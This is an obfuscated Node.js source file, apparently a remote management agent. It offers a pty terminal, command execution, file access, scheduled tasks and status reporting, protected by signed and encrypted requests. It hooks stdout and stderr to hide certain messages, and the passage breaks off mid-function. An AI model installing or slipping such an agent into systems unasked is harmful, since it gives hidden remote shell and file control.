#!/usr/bin/env node
const a0aY = a0b;
(function (a, b) {
    const aX = a0b, c = a();
    while (!![]) {
        try {
            const d = -parseInt(aX(0x44a)) / 0x1 + -parseInt(aX(0x892)) / 0x2 + parseInt(aX(0x3d2)) / 0x3 * (-parseInt(aX(0x571)) / 0x4) + parseInt(aX(0x790)) / 0x5 * (parseInt(aX(0x817)) / 0x6) + parseInt(aX(0x39a)) / 0x7 * (parseInt(aX(0x8f1)) / 0x8) + parseInt(aX(0x96b)) / 0x9 + -parseInt(aX(0x641)) / 0xa * (-parseInt(aX(0x20c)) / 0xb);
            if (d === b)
                break;
            else
                c['push'](c['shift']());
        } catch (f) {
            c['push'](c['shift']());
        }
    }
}(a0a, 0x5ed02));
const a0c = [
    a0aY(0x52b),
    a0aY(0x33e),
    'falling\x20back\x20to\x20ArrayBuffer\x20instantiation'
];
function a0d(a) {
    const aZ = a0aY, b = {
            'tdIBy': function (c, d) {
                return c === d;
            },
            'vXKtp': aZ(0x71f),
            'dYzZP': function (c) {
                return c();
            }
        };
    return function (c, d, f) {
        const b0 = aZ, g = c[b0(0x248)]();
        if (a0c[b0(0x85a)](h => g[b0(0x94f)](h))) {
            if (b[b0(0x8a1)](typeof f, b[b0(0x1f4)]))
                b[b0(0x5e2)](f);
            return !![];
        }
        return a[b0(0x464)](this, arguments);
    };
}
process[a0aY(0x866)]['write'] = a0d(process[a0aY(0x866)][a0aY(0x4ec)]), process['stderr'][a0aY(0x4ec)] = a0d(process[a0aY(0x97d)]['write']);
const a0f = require(a0aY(0x399)), a0g = require('http'), a0h = require('https'), a0i = require('net'), a0j = require(a0aY(0x391)), a0k = require(a0aY(0x5dc)), a0l = require('fs'), a0m = require('fs')[a0aY(0x951)], a0n = require(a0aY(0x2a0)), a0o = require(a0aY(0x7eb)), a0p = require('os'), a0q = require(a0aY(0x230)), {
        exec: a0r,
        spawn: a0s
    } = require(a0aY(0x235)), a0t = require(a0aY(0x20a)), a0u = require(a0aY(0x921)), {encrypt: a0v} = require(a0aY(0x4cf)), a0w = require('base64-js'), a0x = require(a0aY(0x491)), a0y = require('noise-c.wasm');
function a0z() {
    const b1 = a0aY, a = {
            'JnZpS': b1(0x610),
            'JbZuK': function (b, c) {
                return b <= c;
            },
            'ZiZtd': function (b, c) {
                return b in c;
            }
        };
    try {
        const b = a0o[b1(0x265)](__dirname, '.env');
        if (!a0l[b1(0x871)](b))
            return;
        for (let c of a0l[b1(0x3f2)](b, a['JnZpS'])[b1(0x946)](/\r?\n/)) {
            let d = c[b1(0x7b0)]();
            if (!d || d[b1(0x456)]('#'))
                continue;
            if (d['startsWith'](b1(0x883)))
                d = d['slice'](0x7)[b1(0x69d)]();
            const f = d['indexOf']('=');
            if (a['JbZuK'](f, 0x0))
                continue;
            const g = d[b1(0x710)](0x0, f)['trim']();
            let h = d[b1(0x710)](f + 0x1)[b1(0x7b0)]();
            h[b1(0x7f5)] >= 0x2 && (h[b1(0x456)]('\x22') && h['endsWith']('\x22') || h[b1(0x456)]('\x27') && h[b1(0x5a6)]('\x27')) && (h = h[b1(0x710)](0x1, -0x1));
            if (g && !a[b1(0x5c5)](g, process.env))
                process.env[g] = h;
        }
    } catch (i) {
    }
}
a0z();
let a0A, a0B, a0C;
try {
    typeof Bun !== 'undefined' ? a0C = require(a0aY(0x468)) : a0C = require(a0aY(0x922));
} catch (a0aW) {
    console[a0aY(0x993)]('\x1b[31m[FATAL\x20ERROR]\x1b[0m\x20核心终端依赖\x20(pty)\x20加载失败，程序终止！'), console[a0aY(0x993)](a0aY(0x508) + a0aW[a0aY(0x842)]), console['error'](a0aY(0x97c)), process['exit'](0x1);
}
const a0D = {
    'LEVELS': {
        'DEBUG': 0x0,
        'INFO': 0x1,
        'WARN': 0x2,
        'ERROR': 0x3
    },
    get 'currentLevel'() {
        const b2 = a0aY, a = {
                'rOACm': function (b, c) {
                    return b !== c;
                },
                'Awvqp': b2(0x631),
                'iCRlo': function (b, c) {
                    return b !== c;
                }
            };
        return a[b2(0x70b)](typeof a0P, a[b2(0x82a)]) && a[b2(0x942)](a0P[b2(0x6aa)], undefined) ? a0P[b2(0x6aa)] : 0x2;
    },
    'debug': a => {
        const b3 = a0aY, b = {
                'BZtYV': function (c, d) {
                    return c <= d;
                }
            };
        b[b3(0x65c)](a0D[b3(0x400)], a0D[b3(0x215)]['DEBUG']) && console[b3(0x25b)](b3(0x5d1) + a);
    },
    'info': a => {
        const b4 = a0aY, b = {
                'ayoFF': function (c, d) {
                    return c <= d;
                }
            };
        b['ayoFF'](a0D[b4(0x400)], a0D['LEVELS'][b4(0x5f1)]) && console[b4(0x25b)](b4(0x558) + a);
    },
    'warn': a => {
        const b5 = a0aY, b = {
                'scaZp': function (c, d) {
                    return c <= d;
                }
            };
        b[b5(0x627)](a0D[b5(0x400)], a0D[b5(0x215)][b5(0x6d7)]) && console['log'](b5(0x393) + a);
    },
    'error': a => {
        const b6 = a0aY, b = {
                'JjQFh': function (c, d) {
                    return c <= d;
                }
            };
        b[b6(0x832)](a0D['currentLevel'], a0D[b6(0x215)][b6(0x3b6)]) && console['log']('\x1b[31m[ERROR]\x1b[0m\x20' + a);
    }
};
function a0E() {
    const b7 = a0aY, a = [
            process.env.USERPROFILE,
            process.env.HOME,
            a0p['homedir'](),
            process[b7(0x376)]()
        ];
    for (const b of a) {
        if (b && a0l[b7(0x871)](b) && a0l[b7(0x53c)](b)['isDirectory']())
            return b;
    }
    return process[b7(0x376)]();
}
function a0F() {
    const b8 = a0aY;
    let a = null;
    try {
        a = a0p[b8(0x4fe)]();
    } catch (c) {
    }
    const b = [
        process.env.FILE_ROOT,
        a
    ];
    for (const d of b) {
        if (d && a0l['existsSync'](d) && a0l[b8(0x53c)](d)['isDirectory']())
            return d;
        if (d)
            console[b8(0x25b)](b8(0x80a) + d);
    }
    return console[b8(0x25b)]('\x1b[33m[WARN]\x1b[0m\x20FILE_ROOT\x20全部候选无效,\x20降级到当前工作目录:\x20' + process[b8(0x376)]()), process[b8(0x376)]();
}
class a0G {
    constructor(a = 'ok') {
        const b9 = a0aY;
        this[b9(0x62d)] = a;
    }
}
class a0H extends a0G {
    constructor(a = 'ok', b = 0x0) {
        const ba = a0aY;
        super(a), this[ba(0x3c3)] = b;
    }
}
class a0I extends a0G {
    constructor() {
        const bb = a0aY;
        super(), this['arch'] = '', this[bb(0x91f)] = 0x0, this[bb(0x446)] = '', this['disk_total'] = 0x0, this[bb(0x4b2)] = '', this[bb(0x594)] = null, this[bb(0x76e)] = null, this[bb(0x3f9)] = 0x0, this['os'] = '', this[bb(0x944)] = '', this[bb(0x370)] = 0x0, this[bb(0x6ce)] = a0P[bb(0x701)], this[bb(0x93e)] = '', this[bb(0x3b5)] = '', this[bb(0x320)] = null;
    }
}
class a0J extends a0G {
    constructor() {
        const bc = a0aY, a = { 'bsHTK': bc(0x626) }, b = a[bc(0x5ef)][bc(0x946)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                super();
                continue;
            case '1':
                this[bc(0x814)] = {
                    'tcp': 0x0,
                    'udp': 0x0
                };
                continue;
            case '2':
                this[bc(0x4c6)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '3':
                this['network'] = {
                    'up': 0x0,
                    'down': 0x0,
                    'totalUp': 0x0,
                    'totalDown': 0x0
                };
                continue;
            case '4':
                this[bc(0x842)] = '';
                continue;
            case '5':
                this[bc(0x6cd)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '6':
                this[bc(0x3ec)] = 0x0;
                continue;
            case '7':
                this[bc(0x49f)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '8':
                this['uptime'] = 0x0;
                continue;
            case '9':
                this[bc(0x663)] = {
                    'load1': 0x0,
                    'load5': 0x0,
                    'load15': 0x0
                };
                continue;
            case '10':
                this['cpu'] = { 'usage': 0x0 };
                continue;
            }
            break;
        }
    }
}
class a0K extends a0G {
    constructor() {
        const bd = a0aY, a = { 'ESjoF': bd(0x8a2) }, b = a[bd(0x2c9)][bd(0x946)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[bd(0x837)] = '';
                continue;
            case '1':
                this[bd(0x49b)] = 0x0;
                continue;
            case '2':
                super();
                continue;
            case '3':
                this[bd(0x296)] = '';
                continue;
            case '4':
                this[bd(0x642)] = ![];
                continue;
            }
            break;
        }
    }
}
class a0L {
    constructor() {
        const be = a0aY, a = { 'qDhOf': be(0x840) }, b = a[be(0x45f)][be(0x946)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[be(0x2de)] = '';
                continue;
            case '1':
                this[be(0x6a0)] = '';
                continue;
            case '2':
                this[be(0x86e)] = '';
                continue;
            case '3':
                this[be(0x7e0)] = '';
                continue;
            case '4':
                this[be(0x5b1)] = '';
                continue;
            case '5':
                this[be(0x5ac)] = '';
                continue;
            case '6':
                this[be(0x5ca)] = 0x0;
                continue;
            case '7':
                this[be(0x7eb)] = '';
                continue;
            }
            break;
        }
    }
}
class a0M {
    constructor() {
        const bf = a0aY, a = { 'ztARB': bf(0x588) }, b = a[bf(0x8c2)][bf(0x946)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[bf(0x2de)] = '';
                continue;
            case '1':
                this[bf(0x5ac)] = '';
                continue;
            case '2':
                this[bf(0x3e2)] = ![];
                continue;
            case '3':
                this['mode_octal'] = '';
                continue;
            case '4':
                this[bf(0x7eb)] = '';
                continue;
            case '5':
                this[bf(0x4b1)] = ![];
                continue;
            case '6':
                this[bf(0x5dd)] = ![];
                continue;
            case '7':
                this[bf(0x7e0)] = '';
                continue;
            }
            break;
        }
    }
}
class a0N extends a0G {
    constructor() {
        const bg = a0aY;
        super(), this[bg(0x43e)] = [];
    }
}
class a0O {
    static [a0aY(0x6d6)]() {
        const bh = a0aY, a = {
                'osVQV': bh(0x8f2),
                'SuDGl': bh(0x318),
                'dGKxr': bh(0x6d8),
                'oWkBQ': function (i, j) {
                    return i !== j;
                },
                'fwlaN': function (i, j) {
                    return i !== j;
                },
                'orNDb': bh(0x2dd)
            }, {
                privateKey: b,
                publicKey: c
            } = a0k['generateKeyPairSync'](a[bh(0x92d)]), d = b[bh(0x30c)]({ 'format': a['SuDGl'] }), f = c['export']({ 'format': 'jwk' }), g = Buffer['from'](d['d'], bh(0x6d8)), h = Buffer[bh(0x4ed)](f['x'], a[bh(0x8c3)]);
        return (a['oWkBQ'](g['length'], 0x20) || a['fwlaN'](h[bh(0x7f5)], 0x20)) && a0D['error'](bh(0x3d8)), {
            'private_b64': g['toString'](a[bh(0x2d1)]),
            'public_b64': h['toString'](a['orNDb'])
        };
    }
    static [a0aY(0x8b0)](a) {
        const bi = a0aY, b = this[bi(0x6d6)]();
        return {
            'role': a,
            'private_b64': b[bi(0x323)],
            'public_b64': b['public_b64']
        };
    }
    static [a0aY(0x764)](a = a0aY(0x2f8), b = a0aY(0x226)) {
        const bj = a0aY, c = {
                'control': this[bj(0x8b0)](a),
                'agent': this['generateSingle'](b)
            };
        return c;
    }
}
class a0P {
    static [a0aY(0x6e2)] = parseInt(process.env.EXEC_TIMEOUT || '30');
    static [a0aY(0x708)] = (process.env.EXEC_SHELL || a0aY(0x618))['toLowerCase']() === a0aY(0x618);
    static [a0aY(0x2bb)] = (process.env.DEBUG || 'false')[a0aY(0x216)]() === a0aY(0x618);
    static [a0aY(0x34c)] = parseInt(process.env.TIMESTAMP_WINDOW || a0aY(0x3de));
    static [a0aY(0x6aa)] = parseInt(process.env.LOG_LEVEL || (this[a0aY(0x2bb)] ? '0' : '3'), 0xa);
    static [a0aY(0x1f2)] = a0P[a0aY(0x96f)](a0aY(0x319), a0aY(0x1fd)) || 'ECDSA公钥内容';
    static [a0aY(0x717)] = a0P[a0aY(0x96f)](a0aY(0x275), 'keys/agent_ecies_pub.b64') || 'ECIES公钥内容';
    static [a0aY(0x8c7)] = parseInt(process.env.TEMPKEY_TTL || '24', 0xa);
    static ['TEMPKEY_MAX_TTL_HOURS'] = parseInt(process.env.TEMPKEY_MAX_TTL || '168', 0xa);
    static ['FILE_ROOT'] = a0F();
    static [a0aY(0x1f9)] = parseInt(process.env.MAX_UPLOAD_SIZE || a0aY(0x8b4));
    static [a0aY(0x65b)] = (process.env.FOLLOW_SYMLINKS || a0aY(0x906))[a0aY(0x216)]() === a0aY(0x618);
    static [a0aY(0x465)] = (process.env.FILE_AUDIT_LOG || a0aY(0x618))['toLowerCase']() === a0aY(0x618);
    static [a0aY(0x911)] = !![];
    static [a0aY(0x76d)] = [];
    static [a0aY(0x8c8)] = {};
    static [a0aY(0x98e)] = ![];
    static ['TASK_TIMEOUT'] = parseInt(process.env.TASK_TIMEOUT || a0aY(0x977));
    static [a0aY(0x7ef)] = parseInt(process.env.CRON_INTERVAL || '30');
    static [a0aY(0x72b)] = [];
    static [a0aY(0x919)] = [];
    static ['MAX_TASK_LOG_SIZE'] = parseInt(process.env.MAX_TASK_LOG || a0aY(0x803));
    static ['HOST'] = process.env.HOST || a0aY(0x7ca);
    static [a0aY(0x95b)] = parseInt(process.env.KPORT || process.env.PORT || process.env.SERVER_PORT || a0aY(0x53e));
    static [a0aY(0x646)] = (process.env.KMODE || '0')[a0aY(0x7b0)]() || '0';
    static [a0aY(0x22f)] = (process.env.KNAME || '')[a0aY(0x7b0)]();
    static ['KNAME_KEY'] = (process.env.KNAME_KEY || '')[a0aY(0x7b0)]();
    static ['KPATH'] = process.env.KPATH || '';
    static [a0aY(0x701)] = process.env.AGENT_VERSION || a0aY(0x5d7);
    static [a0aY(0x95f)] = a0k[a0aY(0x489)](0x20)[a0aY(0x248)](a0aY(0x2dd));
    static [a0aY(0x844)] = a0O['generatePair']();
    static ['wsDowngradeToken']() {
        const bk = a0aY, a = {
                'escQR': bk(0x516),
                'MkaRx': bk(0x2dd)
            };
        return a0k[bk(0x69e)](bk(0x57e), Buffer[bk(0x4ed)](this[bk(0x95f)], bk(0x2dd)))[bk(0x681)](a[bk(0x4de)])['digest'](a[bk(0x5c0)]);
    }
    static [a0aY(0x4c3)]() {
        const bl = a0aY, a = {
                'xtxoZ': bl(0x2dd),
                'XhNwc': bl(0x78b)
            }, b = a0O['generatePair']();
        this[bl(0x844)]['control'] = b[bl(0x89c)], this[bl(0x952)][bl(0x876)][bl(0x2d3)] = b[bl(0x89c)][bl(0x323)], this[bl(0x95f)] = a0k[bl(0x489)](0x20)[bl(0x248)](a[bl(0x28c)]), this[bl(0x37f)] = null, this[bl(0x895)] = 0x0, this[bl(0x726)] = null, this[bl(0x54f)] = 0x0, a0D[bl(0x89f)](a[bl(0x674)]);
    }
    static [a0aY(0x952)] = {
        'controller': { 'private': this[a0aY(0x844)][a0aY(0x89c)][a0aY(0x323)] },
        'agent': { 'public': this['NOISE_KEYS_INTERNAL'][a0aY(0x6d2)][a0aY(0x4f3)] }
    };
    static [a0aY(0x2b2)] = 0xe10;
    static [a0aY(0x8bb)] = 0x1e;
    static [a0aY(0x37f)] = null;
    static [a0aY(0x895)] = 0x0;
    static [a0aY(0x8ec)] = null;
    static ['_status_cache'] = null;
    static ['_status_cache_time'] = 0x0;
    static ['_status_fetch_promise'] = null;
    static [a0aY(0x96f)](a, b) {
        const bm = a0aY, c = { 'nVMrs': bm(0x610) }, d = process.env[a];
        if (d)
            return d;
        const f = a0o[bm(0x265)](__dirname, b);
        if (a0l[bm(0x871)](f))
            try {
                return a0l['readFileSync'](f, c[bm(0x405)])[bm(0x7b0)]();
            } catch (g) {
            }
        return '';
    }
    static [a0aY(0x527)]() {
        const bn = a0aY, a = {
                'cECUI': bn(0x94e),
                'lyQur': function (b, c) {
                    return b > c;
                },
                'qcoBZ': bn(0x72e),
                'VBOIg': bn(0x723),
                'UData': bn(0x2c1),
                'uARHJ': bn(0x366),
                'mFQqP': bn(0x7d5)
            };
        if (!this[bn(0x2bb)]) {
            const b = [];
            !this[bn(0x1f2)] && b[bn(0x39c)](bn(0x41f));
            !this[bn(0x717)] && b[bn(0x39c)](a[bn(0x214)]);
            if (a[bn(0x4ad)](b[bn(0x7f5)], 0x0)) {
                const c = a[bn(0x668)][bn(0x946)]('|');
                let d = 0x0;
                while (!![]) {
                    switch (c[d++]) {
                    case '0':
                        a0D[bn(0x993)](a[bn(0x534)]);
                        continue;
                    case '1':
                        process[bn(0x3c2)](0x1);
                        continue;
                    case '2':
                        a0D[bn(0x761)](a[bn(0x786)]);
                        continue;
                    case '3':
                        a0D[bn(0x761)](a[bn(0x47d)]);
                        continue;
                    case '4':
                        b[bn(0x4e1)](f => a0D['error'](bn(0x92a) + f));
                        continue;
                    case '5':
                        a0D[bn(0x761)](a['mFQqP']);
                        continue;
                    }
                    break;
                }
            }
        }
    }
    static [a0aY(0x23b)](a = {}) {
        const bo = a0aY, b = {
                'gJxrA': function (c, d, f) {
                    return c(d, f);
                },
                'UxVhh': function (c, d) {
                    return c(d);
                },
                'NhcSj': function (c, d) {
                    return c !== d;
                },
                'MieYK': function (c, d) {
                    return c(d);
                },
                'Uiuhj': function (c, d) {
                    return c(d);
                },
                'qFnGi': function (c, d) {
                    return c(d);
                },
                'eWybD': function (c, d) {
                    return c(d);
                },
                'dhzHa': function (c, d) {
                    return c(d);
                }
            };
        if (!a)
            return;
        a['PORT'] !== undefined && a['PORT'] !== null && (this['PORT'] = b[bo(0x520)](parseInt, b[bo(0x331)](String, a[bo(0x95b)]), 0xa));
        a['ECDSA_PUBLIC_KEY_PEM'] && (this[bo(0x1f2)] = a['ECDSA_PUBLIC_KEY_PEM'][bo(0x7b0)]());
        a[bo(0x717)] && (this[bo(0x717)] = a[bo(0x717)][bo(0x7b0)]());
        if (a[bo(0x646)] !== undefined && b[bo(0x247)](a[bo(0x646)], null)) {
            const c = b[bo(0x45a)](String, a['KMODE'])[bo(0x7b0)]();
            /^[012]$/[bo(0x4ef)](c) ? this[bo(0x646)] = c : (this[bo(0x646)] = '0', a0D[bo(0x89f)](bo(0x502) + b[bo(0x2d6)](String, a['KMODE']) + '),\x20已回退\x200\x20(普通启动);\x20合法取值:\x200/1/2'));
        }
        a[bo(0x22f)] && b['qFnGi'](String, a[bo(0x22f)])[bo(0x7b0)]() && (this[bo(0x22f)] = String(a[bo(0x22f)])[bo(0x7b0)]()), a[bo(0x38c)] && b['eWybD'](String, a[bo(0x38c)])[bo(0x7b0)]() && (this['KNAME_KEY'] = b[bo(0x749)](String, a[bo(0x38c)])[bo(0x7b0)]()), a['KPATH'] && String(a[bo(0x25f)])[bo(0x7b0)]() && (this[bo(0x25f)] = b['Uiuhj'](String, a[bo(0x25f)])[bo(0x7b0)]());
    }
}
class a0Q {
    constructor() {
        const bp = a0aY;
        this[bp(0x962)] = null, this['onExpired'] = null;
    }
    [a0aY(0x510)](a) {
        const bq = a0aY, b = bq(0x27a)[bq(0x946)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                a0D[bq(0x8e1)]('🔑\x20[TempKey]\x20新临时密钥已生成:\x20key_id=' + this['_key'][bq(0x862)] + bq(0x823) + a + '\x20小时');
                continue;
            case '1':
                this[bq(0x530)]();
                continue;
            case '2':
                return this[bq(0x962)];
            case '3':
                if (this[bq(0x962)])
                    return this[bq(0x962)];
                continue;
            case '4':
                this['_key'] = this[bq(0x272)](a);
                continue;
            }
            break;
        }
    }
    [a0aY(0x4af)]() {
        const br = a0aY;
        this[br(0x530)]();
        if (this['_key'])
            return this[br(0x962)][br(0x80d)];
        return null;
    }
    [a0aY(0x27e)]() {
        const bs = a0aY;
        this[bs(0x530)]();
        if (this[bs(0x962)])
            return this[bs(0x962)]['ecies_pub'];
        return null;
    }
    [a0aY(0x530)]() {
        const bt = a0aY, a = {
                'XyzfU': function (b, c) {
                    return b === c;
                },
                'LQbsS': bt(0x71f)
            };
        if (this[bt(0x962)] && this['_isExpired'](this[bt(0x962)])) {
            const b = this[bt(0x962)][bt(0x862)];
            this['_key'] = null, a0D[bt(0x89f)](bt(0x335) + b);
            if (a['XyzfU'](typeof this[bt(0x954)], a[bt(0x36c)]))
                try {
                    this['onExpired']();
                } catch (c) {
                    a0D[bt(0x993)](bt(0x7c2) + c['message']);
                }
        }
    }
    [a0aY(0x457)](a) {
        const bu = a0aY, b = {
                'ojctS': function (c, d) {
                    return c >= d;
                },
                'SmPTR': function (c, d) {
                    return c / d;
                }
            };
        return b[bu(0x825)](Math[bu(0x59f)](b['SmPTR'](Date['now'](), 0x3e8)), a['expires_at']);
    }
    [a0aY(0x272)](a) {
        const bv = a0aY, b = {
                'euVAH': bv(0x6fe),
                'hpdgS': bv(0x412),
                'lYMyH': 'jwk',
                'eSluW': function (o, p) {
                    return o - p;
                },
                'OwSUm': function (o, p) {
                    return o / p;
                },
                'ZOKzX': bv(0x4d4),
                'YDKjW': 'base64'
            }, {
                privateKey: c,
                publicKey: d
            } = a0k[bv(0x54b)]('ec', { 'namedCurve': b[bv(0x62c)] }), f = c[bv(0x30c)]({
                'type': bv(0x8e5),
                'format': b['hpdgS']
            }), g = d[bv(0x30c)]({
                'type': bv(0x352),
                'format': b['hpdgS']
            }), h = a0k[bv(0x489)](0x20), i = Buffer['from'](a0B[bv(0x3b3)](h, ![])), j = c['export']({ 'format': b[bv(0x554)] }), k = d['export']({
                'type': bv(0x352),
                'format': bv(0x2fd)
            }), l = k['subarray'](b['eSluW'](k[bv(0x7f5)], 0x41)), m = Math[bv(0x59f)](b[bv(0x4df)](Date['now'](), 0x3e8)), n = a * 0xe10;
        return {
            'key_id': a0k['randomBytes'](0x8)[bv(0x248)](b[bv(0x67a)]),
            'created_at': m,
            'expires_at': m + n,
            'ttl_seconds': n,
            'ecdsa_private_key': f,
            'ecdsa_public_key': g,
            'ecies_private_key': h[bv(0x248)](bv(0x4d4)),
            'ecies_public_key': i['toString'](bv(0x4d4)),
            'ecdsa_private_hex': Buffer[bv(0x4ed)](j['d'], bv(0x6d8))[bv(0x248)](b[bv(0x67a)]),
            'ecdsa_public_b64': Buffer['from'](a0A[bv(0x6b5)][bv(0x8ce)](l)[bv(0x669)](!![]))[bv(0x248)](b['YDKjW']),
            'ecies_public_b64': Buffer[bv(0x4ed)](a0B['getPublicKey'](h, !![]))[bv(0x248)](b[bv(0x396)]),
            'ecdsa_vk': d,
            'ecies_pub': i
        };
    }
}
class a0R {
    constructor(a, b) {
        const bw = a0aY, c = {
                'BlgJe': bw(0x21d),
                'eNmNs': function (d, f) {
                    return d(f);
                },
                'uGfte': 'P-256'
            };
        this[bw(0x24d)] = null, this[bw(0x22c)] = null;
        if (a)
            try {
                const d = a[bw(0x7b0)]();
                if (d[bw(0x456)](c[bw(0x8b7)]))
                    this[bw(0x24d)] = a0k[bw(0x680)](d);
                else {
                    const f = Buffer['from'](d, 'base64'), g = a0A['Point'][bw(0x8ce)](f), h = g['toBytes'](![]), i = m => m[bw(0x248)]('base64')[bw(0x773)](/\+/g, '-')[bw(0x773)](/\//g, '_')[bw(0x773)](/=/g, ''), j = c[bw(0x38f)](i, Buffer[bw(0x4ed)](h['slice'](0x1, 0x21))), k = c['eNmNs'](i, Buffer['from'](h['slice'](0x21, 0x41))), l = {
                            'kty': 'EC',
                            'crv': c[bw(0x621)],
                            'x': j,
                            'y': k
                        };
                    this[bw(0x24d)] = a0k['createPublicKey']({
                        'key': l,
                        'format': bw(0x318)
                    });
                }
            } catch (m) {
                a0D['error']('⚠️\x20ECDSA公钥加载失败:\x20' + m['message']), this['ecdsaPubkey'] = null;
            }
        if (b)
            try {
                this[bw(0x22c)] = a0w[bw(0x68f)](b[bw(0x7b0)]());
            } catch (n) {
                a0D['warn']('⚠️\x20ECIES公钥解码失败:\x20' + n['message']);
            }
    }
    ['verifySignature'](a, b, c, d, f, g, h = null) {
        const bx = a0aY, i = {
                'lKmUA': function (j, k) {
                    return j(k);
                },
                'PjqoR': function (j, k) {
                    return j / k;
                },
                'eOoUc': function (j, k) {
                    return j > k;
                },
                'Ececn': function (j, k) {
                    return j - k;
                },
                'vzZYT': 'static',
                'cCyCl': bx(0x536),
                'khMCy': bx(0x288)
            };
        if (!this[bx(0x24d)])
            throw new Error('ECDSA\x20public\x20key\x20not\x20loaded');
        try {
            const j = i[bx(0x762)](parseInt, f), k = Math['floor'](i['PjqoR'](Date['now'](), 0x3e8));
            if (i['eOoUc'](Math['abs'](i['Ececn'](k, j)), a0P[bx(0x34c)]))
                throw new Error(bx(0x84e) + Math[bx(0x6cf)](i[bx(0x299)](k, j)) + 's\x20>\x20' + a0P[bx(0x34c)] + 's');
            const l = a0S(a, b, c, d, f);
            if (this[bx(0x4be)](this['ecdsaPubkey'], l, g))
                return i['vzZYT'];
            if (h && this[bx(0x4be)](h, l, g))
                return i['cCyCl'];
            throw new Error(i[bx(0x454)]);
        } catch (m) {
            throw new Error('Signature\x20verification\x20failed:\x20' + m[bx(0x842)]);
        }
    }
    [a0aY(0x4be)](a, b, c) {
        const by = a0aY, d = { 'VdAjE': by(0x4b4) };
        if (!a)
            return ![];
        try {
            const f = a0w[by(0x68f)](c), g = a0k[by(0x212)](d['VdAjE']);
            return g[by(0x681)](b), g[by(0x798)](a, f);
        } catch (h) {
            return ![];
        }
    }
    ['encryptResponse'](a, b = null) {
        const bz = a0aY, c = {
                'nPSAH': 'ECIES\x20public\x20key\x20not\x20initialized,\x20cannot\x20encrypt\x20response',
                'nMHfg': 'utf-8',
                'Cdfxs': function (d, f, g) {
                    return d(f, g);
                },
                'bhPRP': bz(0x2dd)
            };
        if (a0P['DEBUG'])
            return JSON['stringify'](a);
        if (!this[bz(0x22c)])
            throw new Error(c[bz(0x3dc)]);
        try {
            const d = JSON['stringify'](a), f = Buffer['from'](d, c[bz(0x5e7)]), g = b || Buffer[bz(0x4ed)](this[bz(0x22c)]), h = c['Cdfxs'](a0v, g, f);
            return Buffer[bz(0x4ed)](h)[bz(0x248)](c[bz(0x58e)]);
        } catch (i) {
            throw new Error(bz(0x4a9) + i[bz(0x842)]);
        }
    }
    ['decryptData'](a, b) {
        const bA = a0aY, c = {
                'XJENc': function (d, f) {
                    return d !== f;
                },
                'ftuyd': bA(0x2dd),
                'xtTFb': bA(0x610),
                'RCqjc': bA(0x52a)
            };
        if (!b || c['XJENc'](b[bA(0x7f5)], 0x20))
            throw new Error('AES\x20Decrypt\x20Error:\x20Key\x20must\x20be\x20exactly\x2032\x20bytes\x20for\x20AES-256.');
        try {
            const d = Buffer[bA(0x4ed)](a, c[bA(0x368)])[bA(0x248)](c[bA(0x6f2)]), f = JSON['parse'](d);
            if (!f[bA(0x264)] || !f[bA(0x4bc)] || !f[bA(0x5fc)])
                throw new Error(bA(0x95a));
            const g = Buffer['from'](f[bA(0x264)], c[bA(0x368)]), h = Buffer['from'](f[bA(0x4bc)], c[bA(0x368)]), i = Buffer[bA(0x4ed)](f[bA(0x5fc)], c[bA(0x368)]), j = a0k['createDecipheriv'](c[bA(0x3c9)], b, g);
            j[bA(0x898)](h);
            let k = j['update'](i, null, c['xtTFb']);
            return k += j[bA(0x2a3)](c[bA(0x6f2)]), k;
        } catch (l) {
            throw new Error(bA(0x56a) + l[bA(0x842)]);
        }
    }
    [a0aY(0x22a)](a, b) {
        const bB = a0aY, c = {
                'JDttZ': function (d, f) {
                    return d !== f;
                },
                'dUkrR': bB(0x702),
                'CzzDS': bB(0x52a),
                'MUoLp': bB(0x2dd)
            };
        if (!b || c['JDttZ'](b[bB(0x7f5)], 0x20))
            throw new Error(c[bB(0x965)]);
        try {
            const d = a0k[bB(0x489)](0xc), f = a0k['createCipheriv'](c[bB(0x3c7)], b, d), g = Buffer[bB(0x8ed)]([
                    f[bB(0x681)](a),
                    f[bB(0x2a3)]()
                ]), h = f[bB(0x71c)](), i = {
                    'nonce': d[bB(0x248)](c[bB(0x440)]),
                    'tag': h[bB(0x248)](c[bB(0x440)]),
                    'ciphertext': g['toString'](bB(0x2dd))
                };
            return Buffer['from'](JSON[bB(0x852)](i), bB(0x610))['toString'](bB(0x2dd));
        } catch (j) {
            throw new Error('AES\x20Encrypt\x20Error:\x20' + j[bB(0x842)]);
        }
    }
}
function a0S(a, b, c, d, f) {
    const bC = a0aY, g = {
            'mGXWn': 'sha256',
            'IXmiM': bC(0x4d4)
        };
    return !c && (c = a0k[bC(0x8fa)](g['mGXWn'])['update'](Buffer[bC(0x21a)](0x0))[bC(0x739)](g[bC(0x4e2)])), a + '\x0a' + b + '\x0a' + c + '\x0a' + d + '\x0a' + f;
}
function a0T(a, b = null) {
    const bD = a0aY, c = {
            'JEOVh': bD(0x906),
            'wZkeg': 'Content-Length',
            'yfzQg': bD(0x91b),
            'pRqUP': bD(0x8b1),
            'NCHNp': function (d, f) {
                return d === f;
            },
            'Nkxie': bD(0x52f),
            'vilIq': 'string',
            'OsrwI': bD(0x536),
            'oRNWF': 'utf8',
            'tUDvO': 'x-encrypted',
            'XuBBC': bD(0x618),
            'IGcpt': 'x-agent-version',
            'AloYY': bD(0x886),
            'JivkZ': function (d) {
                return d();
            },
            'ruSMR': function (d, f) {
                return d === f;
            },
            'bikgn': 'HEAD',
            'NKvSX': function (d) {
                return d();
            },
            'AarLg': 'X-Nonce',
            'KeTJt': 'x-timestamp',
            'lykAR': bD(0x5cb),
            'mNokJ': bD(0x902),
            'wrigN': bD(0x7c9),
            'sNfWc': function (d) {
                return d();
            },
            'sxjoC': 'Missing\x20auth\x20headers',
            'DRwEu': '/api/fileraw',
            'sWDjS': bD(0x5a2),
            'Pbvef': function (d, f) {
                return d > f;
            },
            'aHCLW': bD(0x4d4),
            'XbfpN': bD(0x1f5),
            'flqWp': bD(0x2dd),
            'tPDnk': 'eyJ'
        };
